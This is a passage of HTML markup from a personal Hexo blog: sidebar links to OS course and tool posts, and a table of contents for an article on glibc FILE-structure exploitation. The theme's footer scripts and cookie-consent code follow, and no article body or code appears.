dateTime="2022-10-23T08:56:00.000Z">2022-10-23</time></p><p class="title"><a href="/2022/10/23/Lab3_Page_tables/">Lab3 Page Tables</a></p><p class="categories"><a href="/categories/Course/">Course</a> / <a href="/categories/Course/MIT-6-1810-2022Fall/">MIT 6.1810 2022Fall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-20T01:36:00.000Z">2022-10-20</time></p><p class="title"><a href="/2022/10/20/Lab2_system_calls/">Lab2 System Calls</a></p><p class="categories"><a href="/categories/Course/">Course</a> / <a href="/categories/Course/MIT-6-1810-2022Fall/">MIT 6.1810 2022Fall</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-17T12:10:00.000Z">2022-10-17</time></p><p class="title"><a href="/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">Gdb 常用命令</a></p><p class="categories"><a href="/categories/Tools/">Tools</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Operating-System/"><span class="tag">Operating System</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pwn/"><span class="tag">Pwn</span><span class="tag">4</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#FILE-结构"><span class="level-left"><span class="level-item">1</span><span class="level-item">FILE 结构</span></span></a></li><li><a class="level is-mobile" href="#fopen-流程"><span class="level-left"><span class="level-item">2</span><span class="level-item">fopen 流程</span></span></a></li><li><a class="level is-mobile" href="#fread-流程"><span class="level-left"><span class="level-item">3</span><span class="level-item">fread 流程</span></span></a></li><li><a class="level is-mobile" href="#fwrite-流程"><span class="level-left"><span class="level-item">4</span><span class="level-item">fwrite 流程</span></span></a></li><li><a class="level is-mobile" href="#fclose-流程"><span class="level-left"><span class="level-item">5</span><span class="level-item">fclose 流程</span></span></a></li><li><a class="level is-mobile" href="#伪造-vtable"><span class="level-left"><span class="level-item">6</span><span class="level-item">伪造 vtable</span></span></a></li><li><a class="level is-mobile" href="#FSOP"><span class="level-left"><span class="level-item">7</span><span class="level-item">FSOP</span></span></a></li><li><a class="level is-mobile" href="#House-of-Orange"><span class="level-left"><span class="level-item">8</span><span class="level-item">House of Orange</span></span></a></li><li><a class="level is-mobile" href="#Pwnable-seethefile"><span class="level-left"><span class="level-item">9</span><span class="level-item">Pwnable seethefile</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 Humoooor</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
